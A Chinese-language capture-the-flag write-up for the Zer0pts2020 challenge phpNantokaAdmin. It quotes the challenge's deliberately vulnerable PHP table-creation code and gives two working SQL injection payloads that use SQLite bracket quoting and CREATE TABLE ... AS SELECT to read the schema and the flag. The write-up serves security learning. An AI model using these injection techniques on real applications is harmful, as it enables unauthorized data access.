# \[Zer0pts2020]phpNantokaAdmin

## \[Zer0pts2020]phpNantokaAdmin

## 考点

* sqlite3 select特性
* sqlite3建表语法

## wp

题目功能流程如下

![](<../.gitbook/assets/image (30).png>)

填参数，点下一步，最后的请求是向/?page=create发送 POST请求，请求内容如下

```
table_name=test&columns[0][name]=testa&columns[0][type]=INTEGER
```

然后请求/?page=index，来到插入数据的页面

![](<../.gitbook/assets/image (4).png>)

向/?page=insert发送POST请求，内容如下

```
values[]=1&values[]=2&values[]=3
```

然后请求/?page=index

![](<../.gitbook/assets/image (33) (1).png>)

那么后台的语句可能如下

```sql
CREATE TABLE test(
   dummy1 TEXT,
   dummy2 TEXT,
   testa INTEGER,
);

INSERT INTO test (dummy1,dummy2,testa) 
          VALUES ('1', '2', 3);
```

但是`testa`那个字段输入字母也会成功插入

![](<../.gitbook/assets/image (1).png>)

然后找信息，啥都没找到，直接用BUU给的代码吧

三个文件，config.php定义flag位置，`flag_bf1811da`表的`flag_2a2d04c3`字段

util.php存放自定义函数，index.php实现路由和视图功能

先说自定义的函数，`redirect($path)`调用header函数进行重定向页面，`flash($message, $path = '?page=index')`向session中写入信息，`e($string)`把string使用`htmlspecialchars($string, ENT_QUOTES)`进行转义，只编码双引号和单引号，`is_valid($string)`判断输入是否含有如下字符

```
["#'()*,\/\\`-]
```

然后index.php，全部采用pdo的方式操作数据库

如果session中存在database字段，就返回`flag_bf1811da`表和`flag_2a2d04c3`字段

insert部分就直接使用insert语句插入POST的values数组，delete是直接清空session，新建一个空白的session

看新建表的地方

要输入表名和列名，只有表名被强制转换为字符串，然后是对表名和列名的限制

```php
  $table_name = (string) $_POST['table_name'];
  $columns = $_POST['columns'];
  $filename = bin2hex(random_bytes(16)) . '.db';
  $pdo = new PDO('sqlite:db/' . $filename);
  if (!is_valid($table_name)) {
    flash('Table name contains dangerous characters.');
  }
  if (strlen($table_name) < 4 || 32 < strlen($table_name)) {
    flash('Table name must be 4-32 characters.');
  }
  if (count($columns) <= 0 || 10 < count($columns)) {
    flash('Number of columns is up to 10.');
  }
```

最后是SQL语句的拼接

```php
  $sql = "CREATE TABLE {$table_name} (";
  $sql .= "dummy1 TEXT, dummy2 TEXT";
  for ($i = 0; $i < count($columns); $i++) {
    $column = (string) ($columns[$i]['name'] ?? '');
    $type = (string) ($columns[$i]['type'] ?? '');

    if (!is_valid($column) || !is_valid($type)) {
      flash('Column name or type contains dangerous characters.');
    }
    if (strlen($column) < 1 || 32 < strlen($column) || strlen($type) < 1 || 32 < strlen($type)) {
      flash('Column name and type must be 1-32 characters.');
    }

    $sql .= ', ';
    $sql .= "`$column` $type";
  }
  $sql .= ');';
```

最终SQL执行顺序

```
CREATE TABLE `FLAG_TABLE` (`FLAG_COLUMN` TEXT);
INSERT INTO `FLAG_TABLE` VALUES ("FLAG");
CREATE TABLE {$table_name} (dummy1 TEXT, dummy2 TEXT, `$column` $type);
```

可控点就是table\_name、column和type

payload

```
table_name=aaaa+as+select+[sql][&columns%5B0%5D%5Bname%5D=]from+sqlite_master;&columns%5B0%5D%5Btype%5D=INTEGER
```

相当于`CREATE TABLE aaaa as select [sql] from sqlite_master;`

![](<../.gitbook/assets/image (24).png>)

payload

```
table_name=aaaa+as+select+[flag_2a2d04c3][&columns%5B0%5D%5Bname%5D=]from+flag_bf1811da;&columns%5B0%5D%5Btype%5D=INTEGER
```

相当于`CREATE TABLE aaaa as select [flag_2a2d04c3] from flag_bf1811da;`

![](<../.gitbook/assets/image (11).png>)



## 小结

1. sqlite3在select时，如果列使用`[]`、`""`、` `` `包裹时会自动忽略这些符号之后的列名
2. sqlite3可以使用`create table ... as select ... from ...` 来复制表
